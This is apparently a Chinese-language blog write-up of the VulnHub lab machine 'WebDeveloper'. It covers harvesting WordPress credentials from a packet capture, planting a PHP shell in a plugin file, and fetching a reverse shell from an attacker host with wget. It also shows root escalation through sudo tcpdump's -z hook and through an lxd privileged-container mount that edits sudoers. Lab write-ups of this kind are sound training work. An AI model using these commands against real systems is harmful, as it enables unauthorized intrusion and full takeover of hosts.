---
layout: post
title:  "vulnhub >_ WebDeveloper"
description: walkthrough
category: vulnhub
---
# WebDeveloper

![image-20200621201954952]({{ site.url }}/assets/WebDeveloper.assets/image-20200621201954952.png)



![image-20200621202010388]({{ site.url }}/assets/WebDeveloper.assets/image-20200621202010388.png)

![image-20200621202802738]({{ site.url }}/assets/WebDeveloper.assets/image-20200621202802738.png)

![image-20200621202834878]({{ site.url }}/assets/WebDeveloper.assets/image-20200621202834878.png)

Wireshark分析一下。找到登录时的发包内容及明文凭证

![image-20200621203407035]({{ site.url }}/assets/WebDeveloper.assets/image-20200621203407035.png)

```bash
webdeveloper
Te5eQg&4sBS!Yr$)wf%(DcAd
```

登录wp

![image-20200621203848874]({{ site.url }}/assets/WebDeveloper.assets/image-20200621203848874.png)

老套路，改404

![image-20200621204507068]({{ site.url }}/assets/WebDeveloper.assets/image-20200621204507068.png)

但是上传时出现错误

![image-20200621205352126]({{ site.url }}/assets/WebDeveloper.assets/image-20200621205352126.png)



还有一种方法是修改插件内的php文件，也可以达成需要的效果

![image-20200621205258982]({{ site.url }}/assets/WebDeveloper.assets/image-20200621205258982.png)

浏览器激活

```bash
http://10.10.10.141/wp-content/plugins/akismet/akismet.php
```



得到shell

![image-20200621205541654]({{ site.url }}/assets/WebDeveloper.assets/image-20200621205541654.png)

基本枚举后在wp的设置中找到mysql凭证

![image-20200621205701460]({{ site.url }}/assets/WebDeveloper.assets/image-20200621205701460.png)

```bash
webdeveloper
MasterOfTheUniverse
```

尝试密码复用

![image-20200621205827640]({{ site.url }}/assets/WebDeveloper.assets/image-20200621205827640.png)

成功并且直接就发现可以sudo利用tcpdump

首先在tmp目录下下载我们预先在kali制作好的php reshell

![image-20200622212446204]({{ site.url }}/assets/WebDeveloper.assets/image-20200622212446204.png)

```bash
wget http://192.168.43.66:8080/php-reshell.php
```

![image-20200622212511138]({{ site.url }}/assets/WebDeveloper.assets/image-20200622212511138.png)

```bash
echo $'php /tmp/php-reshell.php' > /tmp/.evil
chmod +x /tmp/.evil
sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.evil -Z root
```

![image-20200622212646331]({{ site.url }}/assets/WebDeveloper.assets/image-20200622212646331.png)

![image-20200622212702056]({{ site.url }}/assets/WebDeveloper.assets/image-20200622212702056.png)

![image-20200622212716943]({{ site.url }}/assets/WebDeveloper.assets/image-20200622212716943.png)



还有另外一种提权方法



考虑到用户是lxd组成员

![image-20200621214618368]({{ site.url }}/assets/WebDeveloper.assets/image-20200621214618368.png)

可以尝试另外一种提权方法

参考https://reboare.github.io/lxd/lxd-escape.html

```bash
lxd init
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add evil whatever disk source=/ path=/mnt/root recursive=true
lxc start evil
lxc exec evil bash
```

![image-20200621215411035]({{ site.url }}/assets/WebDeveloper.assets/image-20200621215411035.png)

一路回车默认即可





我们创建了一个lxc容器，为其分配了安全性特权，并将完整的磁盘安装在下/mnt/root

这时我们可以对容器内的所有内容进行控制和修改。我们有很多选择。比如修改passwd已增加root用户。也可以修改sudoers，让我们拥有的用户获得sudo 所有命令的权限。

这里我们修改sudoer

```bash
echo "%webdeveloper ALL=(ALL:ALL) ALL" >> /mnt/root/etc/sudoers
```

之后sudo su 即直接提权